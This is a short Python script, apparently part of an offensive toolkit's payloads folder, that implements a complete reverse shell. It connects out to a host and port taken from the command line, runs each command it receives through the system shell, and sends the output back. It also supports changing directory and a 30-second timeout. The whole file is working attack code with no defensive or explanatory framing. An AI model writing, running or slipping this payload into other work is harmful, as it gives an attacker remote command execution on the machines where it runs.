#!/usr/bin/env python3
"""
Generic reverse-shell payload. Reuses the raw-TTY-safe command loop.
Usage: python3 payloads/generic.py [HOST] [PORT]
"""
import socket
import subprocess
import os
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
    except ConnectionRefusedError:
        print(f"[!] Listener not on {HOST}:{PORT}", file=sys.stderr)
        sys.exit(1)

    while True:
        data = s.recv(4096)
        if not data:
            break
        cmd = data.decode(errors="replace").strip()
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit"):
            break
        if cmd.lower().startswith("cd "):
            try:
                os.chdir(cmd[3:].strip())
                s.sendall(b"[ok] cwd changed\n")
            except Exception as e:
                s.sendall(f"[!] {e}\n".encode())
            continue

        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            out = r.stdout + r.stderr or b"[no output]\n"
        except subprocess.TimeoutExpired:
            out = b"[!] timeout\n"
        except Exception as e:
            out = f"[!] {e}\n".encode()

        s.sendall(out)

    s.close()


if __name__ == "__main__":
    main()
